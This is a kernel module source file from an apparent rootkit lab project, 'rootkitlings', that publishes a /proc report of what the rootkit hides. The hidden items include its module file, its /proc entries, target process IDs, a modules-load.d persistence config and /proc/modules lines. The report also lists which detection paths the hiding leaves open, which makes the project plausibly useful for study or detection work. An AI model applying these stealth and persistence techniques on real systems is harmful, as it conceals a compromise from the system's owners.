// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#include "rootkit.h"
#include "visibility.h"

static struct proc_dir_entry *evidence_entry;

static int rk_evidence_show(struct seq_file *output, void *unused)
{
	struct rk_visibility_snapshot view;

	rk_visibility_snapshot(output->private, &view);
	seq_puts(output, "evidence_map_version=2\n");
	seq_puts(output, "map_role=declared-selected-view-scope\n");
	seq_printf(output, "target_worker_pid=%d\n", view.worker_pid);
	seq_printf(output, "target_agent_pid=%d\n", view.agent_pid);
	seq_puts(output, "filter_gate=actions-enabled-at-operation-entry\n");
	seq_puts(output, "filtered_directory=/proc:rootkitlings\n");
	seq_puts(output, "filtered_directory=/proc:rootkitlings_events\n");
	seq_puts(output, "filtered_directory=/proc:rootkitlings_evidence\n");
	seq_puts(output, "filtered_directory=/proc:rootkitlings_agent\n");
	seq_puts(output, "filtered_directory=/proc:target-worker-pid\n");
	seq_puts(output, "filtered_directory=/proc:target-agent-pid\n");
	seq_puts(output, "filtered_directory=/rootkitlings:rootkitlings.ko\n");
	seq_puts(output,
		 "filtered_directory=/etc/modules-load.d:rootkitlings.conf\n");
	seq_puts(output,
		 "filtered_directory=/etc/modules-load.d:"
		 ".rootkitlings.conf.rootkitlings\n");
	seq_puts(output, "filtered_directory=/sys/module:rootkitlings\n");
	seq_puts(output,
		 "filtered_read=/proc/modules:vfs_read:rootkitlings->------------\n");
	seq_puts(output, "outside_filter_scope=direct-path-lookup\n");
	seq_puts(output, "outside_filter_scope=alternate-directory-apis\n");
	seq_puts(output, "outside_filter_scope=alternate-read-apis\n");
	seq_puts(output, "outside_filter_scope=proc-kallsyms\n");
	seq_puts(output, "outside_filter_scope=debugfs-kprobe-registry\n");
	seq_puts(output, "outside_filter_scope=proc-net-tcp-and-sock-diag\n");
	seq_puts(output, "outside_filter_scope=root-shell-process\n");
	seq_puts(output, "outside_filter_scope=kernel-log\n");
	seq_puts(output, "filter_kernel_abi=linux-7.2-x86_64\n");
	seq_printf(output, "directory_limit=%u\n",
		   RK_VISIBILITY_DIRECTORY_LIMIT);
	seq_puts(output, "directory_all_match=leave-unchanged\n");
	seq_printf(output, "directory_changes=%lu\n",
		   view.directory_changes);
	seq_printf(output, "directory_oversize=%lu\n",
		   view.directory_oversize);
	seq_printf(output, "directory_copy_failures=%lu\n",
		   view.directory_copy_failures);
	seq_printf(output, "directory_return_capacity=%u\n",
		   RK_VISIBILITY_DIRECTORY_CAPACITY);
	seq_printf(output, "directory_returns_missed=%u\n",
		   view.directory_returns_missed);
	seq_printf(output, "read_limit=%u\n", RK_VISIBILITY_READ_LIMIT);
	seq_printf(output, "read_redactions=%lu\n", view.read_redactions);
	seq_printf(output, "read_oversize=%lu\n", view.read_oversize);
	seq_printf(output, "read_copy_failures=%lu\n",
		   view.read_copy_failures);
	seq_printf(output, "read_return_capacity=%u\n",
		   RK_VISIBILITY_READ_CAPACITY);
	seq_printf(output, "read_returns_missed=%u\n",
		   view.read_returns_missed);
	return 0;
}

static int rk_evidence_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_evidence_show,
			   proc_pid_ns(file_inode(file)->i_sb));
}

static const struct proc_ops rk_evidence_ops = {
	.proc_open = rk_evidence_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

int rk_evidence_publish(void)
{
	if (evidence_entry)
		return -EINVAL;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_EVIDENCE_PUBLISH)
		evidence_entry = NULL;
	else
		evidence_entry = proc_create("rootkitlings_evidence", 0400, NULL,
					     &rk_evidence_ops);
	return evidence_entry ? 0 : -ENOMEM;
}

void rk_evidence_unpublish(void)
{
	proc_remove(evidence_entry);
	evidence_entry = NULL;
}
